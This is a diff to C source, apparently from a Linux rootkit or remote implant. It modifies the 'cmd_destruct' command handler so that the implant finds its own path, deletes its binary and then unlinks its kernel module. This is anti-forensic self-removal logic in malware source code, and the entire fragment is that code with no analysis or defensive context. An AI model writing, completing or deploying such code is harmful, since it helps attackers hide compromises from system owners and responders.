@@ -5,6 +5,7 @@
 #include "../inc/save.h"
 #include "../inc/util.h"
 
+#include <limits.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -23,23 +24,25 @@
 extern bool should_quit;
 
 char *cmd_destruct(job_t *job) {
+  char self[PATH_MAX+1];
   cmd_recv_all(job);
 
   // no need to delete anything in debug mod
   if (SHRK_DEBUG)
     goto end;
 
-  /*
-
-   * i didnt even know this was a thing, but apperantly "program_invocation_name"
-   * is global variable for argv[0] which is kinda neat for us
-
-  */
-  if (unlink(program_invocation_name) != 0) {
+  // first lets remove ourself
+  if (NULL == get_self(self)) {
+    debug("failed to obtain self path");
+    goto skip_self;
+  }
+   
+  if(unlink(self) != 0){ 
     debug_err("failed to unlink the self");
     return strerror(errno);
   }
 
+skip_self:
   // next, lets remove the kernel module
   if (unlink(SHRK_MODULE) != 0) {
     debug_err("failed to unlink the kernel module");
